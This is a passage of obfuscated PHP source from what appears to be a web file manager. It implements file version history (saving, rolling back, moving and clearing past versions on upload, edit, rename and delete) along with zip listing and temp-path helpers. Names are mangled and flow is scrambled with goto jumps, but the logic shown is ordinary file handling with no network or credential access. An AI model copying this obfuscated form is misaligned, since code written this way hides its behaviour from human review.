$b·ï§¬´æ = isset($CÖ½îŒ) ? $CÖ½îŒ[$F‹¤ô˜öå¼[75]] : $aŞ¾È©İ‡„; goto DŞ†õÁâÉš; e‚ì¥õÙ¡: $B¼Ÿºİøƒƒ = json_encode($EìÈÑ®—…[$F‹¤ô˜öå¼[1063]]); self::setContent($bÖµÔÍŒ‹, $B¼Ÿºİøƒƒ); if (count($EìÈÑ®—…[$F‹¤ô˜öå¼[1063]]) >= $cç‚áÊ“ ) { show_json(sprintf(LNG($F‹¤ô˜öå¼[1067]), count($EìÈÑ®—…[$F‹¤ô˜öå¼[1063]])), !1); } goto c Å†•Å“; Bù—è™š‹: if (isset($CÖ½îŒ)) { $A¢¡Ì•ÑÈ = array($CÖ½îŒ[$F‹¤ô˜öå¼[75]], $CÖ½îŒ[$F‹¤ô˜öå¼[1065]], $CÖ½îŒ[$F‹¤ô˜öå¼[28]]); $A™Ÿ‡Åßã§ = md5(implode($F‹¤ô˜öå¼[70], $A¢¡Ì•ÑÈ)) . $F‹¤ô˜öå¼[94] . get_path_ext($CÖ½îŒ[$F‹¤ô˜öå¼[28]]); } else { $A¢¡Ì•ÑÈ = array($f»Ë‰¹õáª[$F‹¤ô˜öå¼[28]], $f»Ë‰¹õáª[$F‹¤ô˜öå¼[75]], $f»Ë‰¹õáª[$F‹¤ô˜öå¼[77]]); $A™Ÿ‡Åßã§ = md5(implode($F‹¤ô˜öå¼[70], $A¢¡Ì•ÑÈ)) . $F‹¤ô˜öå¼[94] . $e­¬İìšÅ—; } if ($däŒ±¾ Î¿ == -1) { $bÖµÔÍŒ‹ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\167\x2f{$EçÆÌ™¾Ÿø}\x2f{$A™Ÿ‡Åßã§}\x2e\x6c\x6f\147"; $c«ù÷Õ“ƒ¬ = self::infoFull($bÖµÔÍŒ‹); if ($c«ù÷Õ“ƒ¬) { $bÖµÔÍŒ‹ = $c«ù÷Õ“ƒ¬[$F‹¤ô˜öå¼[75]]; $CïÊÔåËÀù = self::getContent($bÖµÔÍŒ‹); if ($CïÊÔåËÀù) { $B¼Ÿºİøƒƒ = json_decode($CïÊÔåËÀù, !0); if (count($B¼Ÿºİøƒƒ) >= $cç‚áÊ“ ) { show_json(sprintf(LNG($F‹¤ô˜öå¼[1067]), count($B¼Ÿºİøƒƒ)), !1); } return $B¼Ÿºİøƒƒ; } } else { $bÖµÔÍŒ‹ = self::mkfile($bÖµÔÍŒ‹); } } $Bµ©³Ä›Ó = TEMP_FILES . $EçÆÌ™¾Ÿø; goto aó ¼ßùÊÒ; CôÌ¡ª„”ö: } private static function fileExt($A†¦æ¿“Ÿ‘) { $FÀãšÔ£Äğ =& $_SERVER[¹Ò‹Ò¹]; $A·¶Ïî¶µ‘ = $A†¦æ¿“Ÿ‘[$FÀãšÔ£Äğ[167]]; if ($A·¶Ïî¶µ‘ == $FÀãšÔ£Äğ[1070]) { $d±Éæí±¡ = $FÀãšÔ£Äğ[1071]; if (substr($A†¦æ¿“Ÿ‘[$FÀãšÔ£Äğ[28]], -strlen($d±Éæí±¡)) == $d±Éæí±¡) { $A·¶Ïî¶µ‘ = $FÀãšÔ£Äğ[1072]; } } self::archiveExt($A·¶Ïî¶µ‘); return $A·¶Ïî¶µ‘; } private static function zipFileList($a¶¿¿ãäƒí, $FÊªî·ñÅ¸ = false) { $E…ó¶Æ˜ =& $_SERVER[¹Ò‹Ò¹]; $BÀÉéÖìÍê = array(); foreach ($a¶¿¿ãäƒí as $D°àãè×Ó) { $cğğÇ›™Â¹ = $D°àãè×Ó[$E…ó¶Æ˜[75]]; if ($FÊªî·ñÅ¸) { $cğğÇ›™Â¹ = self::copy($D°àãè×Ó[$E…ó¶Æ˜[75]], $FÊªî·ñÅ¸, $E…ó¶Æ˜[763]); } else { $CŒ”ÚÏ©¤ª = self::init($D°àãè×Ó[$E…ó¶Æ˜[75]]); if ($CŒ”ÚÏ©¤ª->getType() == $E…ó¶Æ˜[105]) { $cğğÇ›™Â¹ = $CŒ”ÚÏ©¤ª->path; } } if ($cğğÇ›™Â¹ && self::local()->exist($cğğÇ›™Â¹)) { $BÀÉéÖìÍê[$D°àãè×Ó[$E…ó¶Æ˜[75]]] = $cğğÇ›™Â¹; } } if (!empty($BÀÉéÖìÍê)) { return array_values($BÀÉéÖìÍê); } show_json(LNG($E…ó¶Æ˜[1036]), !1); } public static function tmpFileName($AßôÛ§ï¾) { $A„ß™ÂÃÒ˜ =& $_SERVER[¹Ò‹Ò¹]; $AŸ‘ÊØ›»Â = array($AßôÛ§ï¾[$A„ß™ÂÃÒ˜[28]], $AßôÛ§ï¾[$A„ß™ÂÃÒ˜[75]], $AßôÛ§ï¾[$A„ß™ÂÃÒ˜[77]], $AßôÛ§ï¾[$A„ß™ÂÃÒ˜[481]]); return md5(implode($A„ß™ÂÃÒ˜[70], $AŸ‘ÊØ›»Â)); } private static function localFilePath($eîª¢§Æ¯, $DòÁƒÆˆ) { goto eïîà¶æ; cï­•’–××: if ($cïà•ë¡˜[$cäĞÉ¯Ê•[29]] == KodIO::KOD_SOURCE) { $e ÏŠ©Ø‡† = Model($cäĞÉ¯Ê•[769])->fileInfoGet(KodIO::sourceID($eîª¢§Æ¯)); if (!$e ÏŠ©Ø‡†[$cäĞÉ¯Ê•[75]]) { show_json($cäĞÉ¯Ê•[1075], !1); } $eîª¢§Æ¯ = $e ÏŠ©Ø‡†[$cäĞÉ¯Ê•[75]]; } $A„ğ†³‘¢ø = self::init($eîª¢§Æ¯); $DÍ‹¸é¤©Œ = $A„ğ†³‘¢ø->getType(); goto b’Ï¡ÎèŞ; b’Ï¡ÎèŞ: if ($DÍ‹¸é¤©Œ == $cäĞÉ¯Ê•[105] || $DÍ‹¸é¤©Œ == $cäĞÉ¯Ê•[1076]) { if (!$A„ğ†³‘¢ø->exist($A„ğ†³‘¢ø->path)) { show_json(LNG($cäĞÉ¯Ê•[104]), !1); } return $A„ğ†³‘¢ø->path; } return !1; goto c¥¸ŒÇŞÙ; eïîà¶æ: $cäĞÉ¯Ê• =& $_SERVER[¹Ò‹Ò¹]; if ($DòÁƒÆˆ == $cäĞÉ¯Ê•[1073] && strtoupper(substr(PHP_OS, 0, 3)) == $cäĞÉ¯Ê•[1074]) { return !1; } $cïà•ë¡˜ = KodIO::parse($eîª¢§Æ¯); goto cï­•’–××; c¥¸ŒÇŞÙ: } private static function archiveExt($c ‡ŒÜ§ÕË = '') { $GLOBALS[$_SERVER[¹Ò‹Ò¹][1077]] = $c ‡ŒÜ§ÕË; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto f“¸ÃÚšïœ; D§ñÆÄ”Ú±: Hook::bind($B—äÑÓÖ„˜[1084], $B—äÑÓÖ„˜[1085]); Hook::bind($B—äÑÓÖ„˜[1086], $B—äÑÓÖ„˜[1087]); Hook::bind($B—äÑÓÖ„˜[1088], $B—äÑÓÖ„˜[1089]); goto B‹“â·âôõ; f“¸ÃÚšïœ: $B—äÑÓÖ„˜ =& $_SERVER[¹Ò‹Ò¹]; $AÔàÖƒÄè÷ = $GLOBALS[$B—äÑÓÖ„˜[6]][$B—äÑÓÖ„˜[87]][$B—äÑÓÖ„˜[1078]]; if ($AÔàÖƒÄè÷ <= 0) { return; } goto BÂ¡â”Â³à; B‹“â·âôõ: Hook::bind($B—äÑÓÖ„˜[1090], $B—äÑÓÖ„˜[1091]); goto BÜäÚçˆ; BÂ¡â”Â³à: if (isset($_REQUEST[$B—äÑÓÖ„˜[1079]]) && $_REQUEST[$B—äÑÓÖ„˜[1079]] == $B—äÑÓÖ„˜[86]) { return; } Hook::bind($B—äÑÓÖ„˜[1080], $B—äÑÓÖ„˜[1081]); Hook::bind($B—äÑÓÖ„˜[1082], $B—äÑÓÖ„˜[1083]); goto D§ñÆÄ”Ú±; BÜäÚçˆ: } public static function eventBeforeUpload($f±ñçŞ¿¹) { if ($f±ñçŞ¿¹[3] && $f±ñçŞ¿¹[3] != REPEAT_REPLACE) { return; } $a­£Ì±‡—Ã = self::parsePath($f±ñçŞ¿¹[0]); if (!$a­£Ì±‡—Ã) { return; } self::add($a­£Ì±‡—Ã); } public static function eventBeforeEdit($B÷²ö‚Îİ) { $Aà»İ³ôÂ = self::parsePath($B÷²ö‚Îİ[0]); if (!$Aà»İ³ôÂ) { return; } self::add($Aà»İ³ôÂ); } public static function eventBeforeCopyFile($a³†©ÏÔ§ƒ, $CÆŠöÄñÚë, $AĞÉöæº£², $DĞšÆÔÉ©œ, $c¤ÆÖÒ‹æ, $cƒ”ùÊ¨Ê) { $C´ƒÃóƒ¯ = $AĞÉöæº£²->getPathOuter($DĞšÆÔÉ©œ); $d—ªÃê Ÿ© = self::parsePath($C´ƒÃóƒ¯); if (!$d—ªÃê Ÿ©) { return; } self::add($d—ªÃê Ÿ©); } public static function eventBeforeRename($EÜÅ°¢ºå¶) { $eæíŠÛÕ‹ï =& $_SERVER[¹Ò‹Ò¹]; $eã†¶¨ø = self::parsePath($EÜÅ°¢ºå¶[0]); if (!$eã†¶¨ø) { return; } $bøÇ°Ç¶Œî = self::checkInHistory($eã†¶¨ø); if (!$bøÇ°Ç¶Œî) { return; } if ($bøÇ°Ç¶Œî[$eæíŠÛÕ‹ï[29]] == $eæíŠÛÕ‹ï[191]) { $b¦‰ì‡¬Ùô = self::listData($eã†¶¨ø); if ($b¦‰ì‡¬Ùô && $b¦‰ì‡¬Ùô[$eæíŠÛÕ‹ï[365]]) { self::moveHistory($eã†¶¨ø, $EÜÅ°¢ºå¶[1]); } } else { IO::rename($bøÇ°Ç¶Œî[$eæíŠÛÕ‹ï[75]], $EÜÅ°¢ºå¶[1]); } } public static function eventBeforeMove($BÀÆªÂÄ«) { goto Dä‘‚ô„²; Dä‘‚ô„²: $DÎŒÀèæ‰À =& $_SERVER[¹Ò‹Ò¹]; $Bª´¢°†“Ë = self::parsePath($BÀÆªÂÄ«[0]); if (!$Bª´¢°†“Ë) { return; } goto D´íÀª©ŞÎ; D´íÀª©ŞÎ: $EÑ‰¹¼Ùè = self::parsePath($BÀÆªÂÄ«[1]); if (!$EÑ‰¹¼Ùè) { return; } $cï§°ƒ»Ìš = $BÀÆªÂÄ«[3]; goto A²çßâ¬Ş‚; A²çßâ¬Ş‚: $a„ö–‹ˆŠ = self::checkInHistory($Bª´¢°†“Ë); if (!$a„ö–‹ˆŠ) { return; } $Aìˆ‘À“ç = self::pathHistory($EÑ‰¹¼Ùè); goto fèš£÷¼Ã’; fèš£÷¼Ã’: if ($a„ö–‹ˆŠ[$DÎŒÀèæ‰À[29]] == $DÎŒÀèæ‰À[191]) { $côŞ¹í®í = self::listData($Bª´¢°†“Ë); $dä‚­ß‚ = rtrim($EÑ‰¹¼Ùè, $DÎŒÀèæ‰À[8]) . $DÎŒÀèæ‰À[8] . ($cï§°ƒ»Ìš ? $cï§°ƒ»Ìš : get_path_this($Bª´¢°†“Ë)); $C›ŸÙÃ™ªÚ = self::listData($dä‚­ß‚); if ($côŞ¹í®í && $côŞ¹í®í[$DÎŒÀèæ‰À[365]] && $C›ŸÙÃ™ªÚ && $C›ŸÙÃ™ªÚ[$DÎŒÀèæ‰À[365]]) { return self::clear($Bª´¢°†“Ë); } if ($côŞ¹í®í && $côŞ¹í®í[$DÎŒÀèæ‰À[365]]) { self::moveHistory($Bª´¢°†“Ë, $cï§°ƒ»Ìš, $Aìˆ‘À“ç); } } else { IO::move($a„ö–‹ˆŠ[$DÎŒÀèæ‰À[75]], $Aìˆ‘À“ç, !1, $cï§°ƒ»Ìš); self::clearEmptyFolder(IO::pathFather($a„ö–‹ˆŠ[$DÎŒÀèæ‰À[75]])); } goto DğŠ°×ø‡·; DğŠ°×ø‡·: } public static function eventAfterRemove($bÑÏéÍŒ¿, $cæ¨‡‰Ä) { goto F–ÃØ‰‰Ò; F–ÃØ‰‰Ò: $EÀÍêŸíŞ‚ =& $_SERVER[¹Ò‹Ò¹]; if (!$cæ¨‡‰Ä) { return; } $bà×ÍÕ—÷ñ = self::parsePath($bÑÏéÍŒ¿[0]); goto AéĞª†ëéÁ; AéĞª†ëéÁ: if (!$bà×ÍÕ—÷ñ) { return; } $cö”Ë…Í‚İ = self::checkInHistory($bà×ÍÕ—÷ñ); if (!$cö”Ë…Í‚İ) { return; } goto FÑˆ––øò; FÑˆ––øò: if ($cö”Ë…Í‚İ[$EÀÍêŸíŞ‚[29]] == $EÀÍêŸíŞ‚[191]) { $aÓåÎÑØã¿ = self::listData($bà×ÍÕ—÷ñ, !1); if ($aÓåÎÑØã¿ && $aÓåÎÑØã¿[$EÀÍêŸíŞ‚[365]]) { self::clear($bà×ÍÕ—÷ñ, !1); } } else { IO::remove($cö”Ë…Í‚İ[$EÀÍêŸíŞ‚[75]]); self::clearEmptyFolder(IO::pathFather($cö”Ë…Í‚İ[$EÀÍêŸíŞ‚[75]])); } goto A°Ãµ‰Óº¡; A°Ãµ‰Óº¡: } private static function checkInHistory($dôÊ‘ºƒÄÀ) { $F†Ú‚ƒ­óÓ = self::pathHistory($dôÊ‘ºƒÄÀ); if (!IO::exist($F†Ú‚ƒ­óÓ)) { $F†Ú‚ƒ­óÓ .= $_SERVER[¹Ò‹Ò¹][1092]; } return IO::exist($F†Ú‚ƒ­óÓ) ? IO::info($F†Ú‚ƒ­óÓ) : !1; } private static function parsePath($B‡›Ğ¹¯“Ş) { goto Få¹”ÆÔÓ™; ešİ‰­Òó: return $B‡›Ğ¹¯“Ş; goto dÙº¼¢††ä; dÚ¹ñ©­Ğî: $C„Óô¤ÚÛµ = KodIO::parse($B‡›Ğ¹¯“Ş); $D½ö«¤ÈŸ” = $C„Óô¤ÚÛµ[$eºí°…ÁĞ§[29]]; $Eœ†ëáô…Ä = !$D½ö«¤ÈŸ” || $D½ö«¤ÈŸ” == KodIO::KOD_IO || $D½ö«¤ÈŸ” == KodIO::KOD_SHARE_ITEM; goto bá¬·›™Æ—; Få¹”ÆÔÓ™: $eºí°…ÁĞ§ =& $_SERVER[¹Ò‹Ò¹]; if (!$B‡›Ğ¹¯“Ş) { return !1; } if ($GLOBALS[$eºí°…ÁĞ§[1093]]) { return; } goto dÚ¹ñ©­Ğî; bá¬·›™Æ—: if (!$Eœ†ëáô…Ä || !$C„Óô¤ÚÛµ[$eºí°…ÁĞ§[1094]]) { return !1; } if ($D½ö«¤ÈŸ” == KodIO::KOD_SHARE_ITEM) { $c³Ç‘ï„ê = IO::init($B‡›Ğ¹¯“Ş); if ($c³Ç‘ï„ê->pathParse[$eºí°…ÁĞ§[1023]]) { return self::parsePath($c³Ç‘ï„ê->pathParse[$eºí°…ÁĞ§[1023]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto eŒİìÁŒ“¤; eŒİìÁŒ“¤: $c¸ÅŠ»Ç©‚ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eºí°…ÁĞ§[1095]); foreach ($c¸ÅŠ»Ç©‚ as $c‹Ãµ´Ş¤) { if (!$D½ö«¤ÈŸ” && substr($B‡›Ğ¹¯“Ş, 0, strlen($c‹Ãµ´Ş¤)) == $c‹Ãµ´Ş¤) { return !1; } } self::log($GLOBALS[$eºí°…ÁĞ§[1018]] . $eºí°…ÁĞ§[1096] . $B‡›Ğ¹¯“Ş); goto ešİ‰­Òó; dÙº¼¢††ä: } private static function pathHistory($aŠÍÒ‘­î) { $aéä ÇĞ‹ä =& $_SERVER[¹Ò‹Ò¹]; $c Ÿ¹­»ùÁ = self::$_historyBase . ltrim(KodIO::clear($aŠÍÒ‘­î), $aéä ÇĞ‹ä[8]); $c Ÿ¹­»ùÁ = str_replace(array($aéä ÇĞ‹ä[1097]), array($aéä ÇĞ‹ä[1098]), $c Ÿ¹­»ùÁ); return $c Ÿ¹­»ùÁ; } public static function log($f¦â‘±Š†) { } public static function historyCount($e¦¸­å³—) { $bµŒÀ¯’Ä =& $_SERVER[¹Ò‹Ò¹]; $c ÏÕ§Ò‹ = array(); $A™Æä÷ÒÙÂ = array(); foreach ($e¦¸­å³— as $E‡“ñâ˜ç¸) { $Bù˜†¼ùÂ = get_path_father($E‡“ñâ˜ç¸); if (!$A™Æä÷ÒÙÂ[$Bù˜†¼ùÂ]) { $A™Æä÷ÒÙÂ[$Bù˜†¼ùÂ] = array(); } $A™Æä÷ÒÙÂ[$Bù˜†¼ùÂ][] = get_path_this($E‡“ñâ˜ç¸); } foreach ($A™Æä÷ÒÙÂ as $Bù˜†¼ùÂ => $Eğïƒ¸³) { $Fì‹‡ãˆîœ = self::parsePath($Bù˜†¼ùÂ); if (!$Fì‹‡ãˆîœ) { continue; } foreach ($Eğïƒ¸³ as $f¨ç¡…Œº¥) { $C¤£³°·¼ = self::listData(rtrim($Fì‹‡ãˆîœ, $bµŒÀ¯’Ä[8]) . $bµŒÀ¯’Ä[8] . $f¨ç¡…Œº¥, !1); if ($C¤£³°·¼ && $C¤£³°·¼[$bµŒÀ¯’Ä[365]]) { $c ÏÕ§Ò‹[rtrim($Bù˜†¼ùÂ, $bµŒÀ¯’Ä[8]) . $bµŒÀ¯’Ä[8] . $f¨ç¡…Œº¥] = count($C¤£³°·¼[$bµŒÀ¯’Ä[365]]); } } } return $c ÏÕ§Ò‹; } public static function add($c¥¬Û”áêé) { goto Böâæ—®¿ƒ; F‡³Äîãàà: if ($Cõ¨ïÒ“– <= 0) { return; } $aªª®ïŞ×† = IO::hashSimple($c¥¬Û”áêé); $fãº¥ìİ½ = IO::info($c¥¬Û”áêé); goto eŸĞâÑˆŸ; cì‚ˆˆÇ¿: return self::saveData($bêÉè½­à¬[$b—¦¨ÔÙÛ‚[1105]], $E¨Ê´éÚÙé); goto F«ˆç„“Ù; C·£™î¯¶¨: if (!$d•õ•äó‰Ô) { self::clearEmptyFolder($bêÉè½­à¬[$b—¦¨ÔÙÛ‚[1104]]); return !1; } array_unshift($E¨Ê´éÚÙé, $cè£¨øæ«ˆ); if (count($E¨Ê´éÚÙé) > $Bˆ—ñÍÌÇ¦) { $A·†‘‰±ôÛ = array_slice($E¨Ê´éÚÙé, $Bˆ—ñÍÌÇ¦); foreach ($A·†‘‰±ôÛ as $F©¤µœÆ•) { IO::remove($bêÉè½­à¬[$b—¦¨ÔÙÛ‚[1104]] . $F©¤µœÆ•[$b—¦¨ÔÙÛ‚[28]]); } $E¨Ê´éÚÙé = array_slice($E¨Ê´éÚÙé, 0, $Bˆ—ñÍÌÇ¦); } goto cì‚ˆˆÇ¿; EíµãÎèÒã: $cè£¨øæ«ˆ = array($b—¦¨ÔÙÛ‚[388] => $e³…åŸä, $b—¦¨ÔÙÛ‚[170] => $aªª®ïŞ×†, $b—¦¨ÔÙÛ‚[28] => $fãº¥ìİ½[$b—¦¨ÔÙÛ‚[28]] . $b—¦¨ÔÙÛ‚[94] . date($b—¦¨ÔÙÛ‚[1102]) . rand_string(1), $b—¦¨ÔÙÛ‚[77] => $fãº¥ìİ½[$b—¦¨ÔÙÛ‚[77]], $b—¦¨ÔÙÛ‚[426] => USER_ID, $b—¦¨ÔÙÛ‚[192] => time(), $b—¦¨ÔÙÛ‚[1103] => $b—¦¨ÔÙÛ‚[33]); IO::mkdir($bêÉè½­à¬[$b—¦¨ÔÙÛ‚[1104]]); $d•õ•äó‰Ô = IO::copy($c¥¬Û”áêé, $bêÉè½­à¬[$b—¦¨ÔÙÛ‚[1104]], !1, $cè£¨øæ«ˆ[$b—¦¨ÔÙÛ‚[28]]); goto C·£™î¯¶¨; Böâæ—®¿ƒ: $b—¦¨ÔÙÛ‚ =& $_SERVER[¹Ò‹Ò¹]; $bêÉè½­à¬ = self::listData($c¥¬Û”áêé); if (!$bêÉè½­à¬) { return; } goto b„·ôÏ; A±‚À Í¼±: if ($E¨Ê´éÚÙé && $E¨Ê´éÚÙé[0][$b—¦¨ÔÙÛ‚[170]] == $aªª®ïŞ×†) { return !0; } if (array_key_exists($b—¦¨ÔÙÛ‚[194], $fãº¥ìİ½) && !$fãº¥ìİ½[$b—¦¨ÔÙÛ‚[194]]) { return !1; } $e³…åŸä = short_id(time()); goto EíµãÎèÒã; eŸĞâÑˆŸ: $E¨Ê´éÚÙé = $bêÉè½­à¬[$b—¦¨ÔÙÛ‚[365]]; if ($fãº¥ìİ½[$b—¦¨ÔÙÛ‚[77]] == 0) { return; } if ($fãº¥ìİ½[$b—¦¨ÔÙÛ‚[77]] >= 1024 * 1024 * 500) { return !1; } goto A±‚À Í¼±; b„·ôÏ: $AÜÏæ§ÅÀÖ = Model($b—¦¨ÔÙÛ‚[1099])->get($b—¦¨ÔÙÛ‚[1100]); $Cõ¨ïÒ“– = $GLOBALS[$b—¦¨ÔÙÛ‚[6]][$b—¦¨ÔÙÛ‚[87]][$b—¦¨ÔÙÛ‚[1078]]; $Bˆ—ñÍÌÇ¦ = $AÜÏæ§ÅÀÖ == $b—¦¨ÔÙÛ‚[1101] ? 5 : $Cõ¨ïÒ“–; goto F‡³Äîãàà; F«ˆç„“Ù: } public static function remove($FÎŒÅÚ“‚«, $F©‚œËç») { $B„°ï®Ââ’ =& $_SERVER[¹Ò‹Ò¹]; $Bíì¨¢Éƒ¦ = self::listData($FÎŒÅÚ“‚«); $D¯ß”’ = array(); if (!$Bíì¨¢Éƒ¦) { return !1; } foreach ($Bíì¨¢Éƒ¦[$B„°ï®Ââ’[365]] as $Fè±ø½µ›) { if ($Fè±ø½µ›[$B„°ï®Ââ’[388]] == $F©‚œËç») { IO::remove($Bíì¨¢Éƒ¦[$B„°ï®Ââ’[1104]] . $Fè±ø½µ›[$B„°ï®Ââ’[28]]); continue; } $D¯ß”’[] = $Fè±ø½µ›; } return self::saveData($Bíì¨¢Éƒ¦[$B„°ï®Ââ’[1105]], $D¯ß”’); } public static function clear($Cñ’á©·®İ, $F¹Ò¶¥“éÒ = true) { $FÓ‘›öºñ¿ =& $_SERVER[¹Ò‹Ò¹]; $E½“•Òò± = self::listData($Cñ’á©·®İ, $F¹Ò¶¥“éÒ); if (!$E½“•Òò±) { return !1; } foreach ($E½“•Òò±[$FÓ‘›öºñ¿[365]] as $cÒÂöÚÈ¶î) { IO::remove($E½“•Òò±[$FÓ‘›öºñ¿[1104]] . $cÒÂöÚÈ¶î[$FÓ‘›öºñ¿[28]]); } return self::saveData($E½“•Òò±[$FÓ‘›öºñ¿[1105]], array()); } public static function moveHistory($a…Ú¨ ğÕÓ, $AŒ¢µ‘ƒ„„ = '', $Cçéƒµ”‰È = '') { goto a•Íä©Ò; C÷‚‚½³¦¬: $cß‹ŠÖƒÑ¨ = $b‘ëƒ‚Â—[1092]; $AŒ¢µ‘ƒ„„ = $AŒ¢µ‘ƒ„„ ? $AŒ¢µ‘ƒ„„ : get_path_this($a…Ú¨ ğÕÓ); $Cçéƒµ”‰È = $Cçéƒµ”‰È ? $Cçéƒµ”‰È : $CØ…Âµ£Òá[$b‘ëƒ‚Â—[1104]]; goto fÚªÜ¥Î™—; a•Íä©Ò: $b‘ëƒ‚Â— =& $_SERVER[¹Ò‹Ò¹]; $CØ…Âµ£Òá = self::listData($a…Ú¨ ğÕÓ, !1); if (!$CØ…Âµ£Òá || !$CØ…Âµ£Òá[$b‘ëƒ‚Â—[365]]) { return !1; } goto C÷‚‚½³¦¬; fÚªÜ¥Î™—: $EÏçõÛë = substr(get_path_this($CØ…Âµ£Òá[$b‘ëƒ‚Â—[1105]]), 0, -strlen($cß‹ŠÖƒÑ¨)); foreach ($CØ…Âµ£Òá[$b‘ëƒ‚Â—[365]] as $Aß‘ö–³ò… => $Fˆíô•¦Æ) { $DĞÛã›è‡ = $AŒ¢µ‘ƒ„„ . substr($Fˆíô•¦Æ[$b‘ëƒ‚Â—[28]], strlen($EÏçõÛë)); $cˆˆá‚Ã© = IO::move($CØ…Âµ£Òá[$b‘ëƒ‚Â—[1104]] . $Fˆíô•¦Æ[$b‘ëƒ‚Â—[28]], $Cçéƒµ”‰È, !1, $DĞÛã›è‡); if ($cˆˆá‚Ã©) { $CØ…Âµ£Òá[$b‘ëƒ‚Â—[365]][$Aß‘ö–³ò…][$b‘ëƒ‚Â—[28]] = $DĞÛã›è‡; } } $CØ…Âµ£Òá[$b‘ëƒ‚Â—[1105]] = IO::move($CØ…Âµ£Òá[$b‘ëƒ‚Â—[1105]], $Cçéƒµ”‰È, !1, $AŒ¢µ‘ƒ„„ . $cß‹ŠÖƒÑ¨); goto BŸ·„¢; BŸ·„¢: self::saveData($CØ…Âµ£Òá[$b‘ëƒ‚Â—[1105]], $CØ…Âµ£Òá[$b‘ëƒ‚Â—[365]]); self::clearEmptyFolder($CØ…Âµ£Òá[$b‘ëƒ‚Â—[1104]]); goto b¾›­§ä·; b¾›­§ä·: } public static function rollback($b··Š‰¹’ë, $dçó˜ñÛè) { $f×ó……ÚÆÅ =& $_SERVER[¹Ò‹Ò¹]; $F÷š«ŠÏ±â = self::listData($b··Š‰¹’ë); if (!$F÷š«ŠÏ±â) { return; } $AÒ¡ë‰Ñª = IO::info($b··Š‰¹’ë); foreach ($F÷š«ŠÏ±â[$f×ó……ÚÆÅ[365]] as $A´®§¥‹ => $CÑ¦ˆˆÄùº) { if ($CÑ¦ˆˆÄùº[$f×ó……ÚÆÅ[388]] == $dçó˜ñÛè) { self::add($b··Š‰¹’ë); $d×İ¶™¶‹ = $F÷š«ŠÏ±â[$f×ó……ÚÆÅ[1104]] . $CÑ¦ˆˆÄùº[$f×ó……ÚÆÅ[28]]; $E®±„ƒ = IO::copy($d×İ¶™¶‹, IO::pathFather($b··Š‰¹’ë), REPEAT_REPLACE, $AÒ¡ë‰Ñª[$f×ó……ÚÆÅ[28]]); if ($E®±„ƒ) { self::remove($b··Š‰¹’ë, $dçó˜ñÛè); } return $E®±„ƒ; } } return !1; } public static function setDetail($d †ª°«Áƒ, $aóŠ„°Ä×, $cï‰†¼±öå) { $Bšºå¥ÑÀƒ =& $_SERVER[¹Ò‹Ò¹]; $b‚·Ø×è² = self::listData($d †ª°«Áƒ); if (!$b‚·Ø×è²) { return; } foreach ($b‚·Ø×è²[$Bšºå¥ÑÀƒ[365]] as $DÍ°õ›İĞ => $c¦â„ñ†áè) { if ($c¦â„ñ†áè[$Bšºå¥ÑÀƒ[388]] == $aóŠ„°Ä×) { $b‚·Ø×è²[$Bšºå¥ÑÀƒ[365]][$DÍ°õ›İĞ][$Bšºå¥ÑÀƒ[1103]] = $cï‰†¼±öå; self::saveData($b‚·Ø×è²[$Bšºå¥ÑÀƒ[1105]], $b‚·Ø×è²[$Bšºå¥ÑÀƒ[365]]); return !0; } } return !1; } public static function fileInfo($d¾Œ­ßÃ®, $cŞÉ¬‡âÇÏ) { goto B¼§§¤Ä¬; Fá¥Ì¹À«Ç: return IO::info($a¦ùÛ¸¶ø); goto eà¶ª®İ¡±; B¼§§¤Ä¬: $aŸ¶¬ùÛœ¦ =& $_SERVER[¹Ò‹Ò¹]; $CêÑâˆ³É = self::listData($d¾Œ­ßÃ®); if (!$CêÑâˆ³É) { show_json(LNG($aŸ¶¬ùÛœ¦[104]), !1); } goto dÇƒÂ‚“¬‹; dÇƒÂ‚“¬‹: $a¦ùÛ¸¶ø = $aŸ¶¬ùÛœ¦[33]; foreach ($CêÑâˆ³É[$aŸ¶¬ùÛœ¦[365]] as $dä•® Çã => $AÀ…ÍåçØ‡) { if ($AÀ…ÍåçØ‡[$aŸ¶¬ùÛœ¦[388]] != $cŞÉ¬‡âÇÏ) { continue; } $a¦ùÛ¸¶ø = $CêÑâˆ³É[$aŸ¶¬ùÛœ¦[1104]] . $AÀ…ÍåçØ‡[$aŸ¶¬ùÛœ¦[28]]; break; } if (!$a¦ùÛ¸¶ø) { show_json(LNG($aŸ¶¬ùÛœ¦[104]), !1); } goto Fá¥Ì¹À«Ç; eà¶ª®İ¡±: } public static function fileOut($FùÄˆŒÊä , $E‹éìè©¨”, $dî™ÇÃö·Ÿ = false) { $A˜ÒÀ²‰ì¸ =& $_SERVER[¹Ò‹Ò¹]; $A¾½”Ê°íì = self::fileInfo($FùÄˆŒÊä , $E‹éìè©¨”); $d‰ÀåµÛÀ÷ =& $GLOBALS[$A˜ÒÀ²‰ì¸[7]]; $dî™ÇÃö·Ÿ = isset($d‰ÀåµÛÀ÷[$A˜ÒÀ²‰ì¸[1069]]) && $d‰ÀåµÛÀ÷[$A˜ÒÀ²‰ì¸[1069]] == 1; if (isset($d‰ÀåµÛÀ÷[$A˜ÒÀ²‰ì¸[29]]) && $d‰ÀåµÛÀ÷[$A˜ÒÀ²‰ì¸[29]] == $A˜ÒÀ²‰ì¸[1106]) { return IO::fileOutImage($A¾½”Ê°íì[$A˜ÒÀ²‰ì¸[75]], $d‰ÀåµÛÀ÷[$A˜ÒÀ²‰ì¸[1107]]); } IO::fileOut($A¾½”Ê°íì[$A˜ÒÀ²‰ì¸[75]], $dî™ÇÃö·Ÿ, get_path_this($FùÄˆŒÊä )); } public static function listData($D¹…½Çœ‰, $d¨ƒ¢Ó²ÎÊ = true) { goto aæùØÈšÑÉ; aæùØÈšÑÉ: $AæÌËœÒ =& $_SERVER[¹Ò‹Ò¹]; if ($d¨ƒ¢Ó²ÎÊ && !IO::exist($D¹…½Çœ‰)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto CŒˆŒ¯©; CŒˆŒ¯©: if (substr($D¹…½Çœ‰, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fÎß»å‚ù½ = self::pathHistory($D¹…½Çœ‰); $aª‘™êëÁ… = array($AæÌËœÒ[1105] => $fÎß»å‚ù½ . $AæÌËœÒ[1092], $AæÌËœÒ[1104] => rtrim(get_path_father($fÎß»å‚ù½), $AæÌËœÒ[8]) . 